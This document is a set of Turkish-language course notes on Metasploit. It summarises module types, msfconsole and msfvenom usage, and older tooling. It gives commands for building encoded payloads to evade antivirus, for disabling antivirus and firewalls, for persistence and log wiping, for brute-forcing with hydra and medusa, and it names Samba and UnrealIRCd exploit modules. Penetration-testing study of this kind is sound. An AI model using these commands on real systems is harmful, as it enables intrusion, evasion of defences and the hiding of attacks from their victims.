## Bolum 2 (msf)

Program turleri:

1. Exploit: Sistemi hack'lemeye yarayan araclar
2. Auxiliary: Tarama, brute-force gibi yardimci programlar
3. Post-exploit: Sisteme girildikten sonra kullanilan programlar
4. Payload: Sisteme girildikten sonra sistemde belli bir amaci gerceklestiren program
5. Encoder, nops, evasion: Anti-viruslere yakalanmamak icin kullanilan programlardir

- Yazim sekli → yazilimturu/hedefsistem/servis/uygulama
    
    ```
                          exploit/windows/wins/ms04_045_wins
    ```
    
- Aux turleri olarak sunlar ornek verilebilir: admin, analyze, client, dos, gather, scanner, server, spoof, sqli, voip...
    
- msfconsole -r path.txt ile komut calistirilabilir
    

### Kullanim ozet:

```jsx
show exploits
use exploit <> | show options | set options
show payloads
set payload <>
show advanced / show encoders
set EnableStageEncoding true StageEncoder <encoder>
show evasion
set evasion <evasion>
exploit
```

```jsx
msfvenom -l payloads
msfvenom -p <payload> --list-options
msfvenom -p <payload> -l encoders
msfvenom -p <payload> -e <encoder> -i (encoder time) 2 USER=kimolursa -f exe -o output.exe -a <arch x86/x64>
```

### Detaylar

- Payload
    
    Iki tip kullanimi vardir:
    
    1. Exploit seciminden sonra 'show payloads set payload' ile dahili olarak kullanilabilir
    2. Msfvenom ile harici olarak kullanilabilir. (msfvenom windows/adduser LHOST=<IP> -f exe -o payload.exe)
- Encoder
    
    Antiviruslere yakalanmamak icin yazilimi cesitli islemlere sokarak farkli bir formata donusturur. Iki sekilde kullanimi vardir:
    
    1. Msfconsole icinde dahili
        
        set payload
        
        show encoders
        
        show advanced
        
        set EnableStageEncoding true set StageEncoder <encoder>
        
    2. Msfvenom icinde harici
        
        msfvenom -p <payload> -l encoders
        
        msfvenom -p windows/adduser -e x86/shikata-ga-nai -i (encoder time) 2 USER=he PASS=hehe -f exe -o output.exe
        
- Nop
    
    Nop'lar, antiviruslere yakalanmamak icin payloadlara bos kodlar ekleyen yazilimlardir. -n 10 → dosyanin boyutuna 10 byte ekler. Dosyanin imza bolumunu degistirir.
    
- Evasion
    
    Yeni nesil antivirus engelleyicilerdir.
    

## Bolum 3 (Komutlar)

- back: geri
- loadpath: Local exploit calistirma
- jobs: Aktif isler
- makerc: Log tutma
- kill: Oturum sonlandirma
- save: Kayit
- load: Eklentiler
- unload: Eklentileri kaldir
- unset: Parametreleri kaldir

Not: Msfvenom'da android uygulamalari -f raw not apk

Not: Evasion'lar exploit gibi calisirlar

## Bolum 11 (İlerleme)

- download -r, upload -r, search -f *.txt, search -d <dir>
- run getcountermeasure -d(dis fw) -k(kill AV,HIPS): Firewall-av kapatma
- post/windows/manage/killav: Firewall-av kapatma
- run persistence -A(auto) -U(user logon) -i(interval) -p(port) -r(remote host)
- Persistence dosyari C:\Windows\Temp klasorunde .vbs uzantili olarak tutulur
- clearev: Log temizleme
- run event_manager: Genel temizlik
- kill -s: Oturumu sonlandir

## Eski mufredat

- armitage→add host→scan(nmap)→attacks(find)→check→use
- medusa -h<host> -U<userpath> -P<pwpath> -M <protocol>
- aux/scanner/ssh/ssh_login ile SSH-BF yapilabilir
- aux/scanner/portscan/tcp ile acik portlar taranabilir
- hydra -s<port> -V -L <login> -P<pass> -e nsf(additional checks) —t(16-64/task number) <IP> <protocol>
- aux/scan/telnet/telnet_login: Telnet brute-force
- aux/sc/smtp/smtp-version: SMTP banner+version+mail
- aux/sc/smtp/smtp-enum: SMTP user info
- aux/gather/enum-dns: Gather DNS info
- aux/sc/dns/dns_amp: Paket karsiliginda ne kadar paket geliyor (Recursive-Amp attack)
- exp/linux/samba/is_known_pipename: 3.5.0-4.4.14, 4.5.10, 4.6.4 arbitrary hack
- exp/linux/samba/trans2open: 2.2.0-2.2.8 buffer overflow
- exp/multi/samba/usermap_script: 3.0.20-3.0.25rc3 command exec
- post/multi/manage/shell-to-meterpreter
- rlogin eski ve guvensiz bir remote login protokoludur. 512,513,514 portlari kullanir. rlogin -L <user> <IP> ile giris yapilir.
- mysql -h <host> -u <username> -p <password>
- exp/unix/irc/unreal_ircd_3281_backdoor
- Armitage ile Hail Mary ile secili tum hostlara uygun tum exploit'ler uygulanabilir
- Linux'da calistirilabilir dosya uzantifi .elf'tir
- OSX'te calistirilabilir dosya uzantisi .macho'dur
- github/Mebus/cupp.git → Kisiye ozel wordlist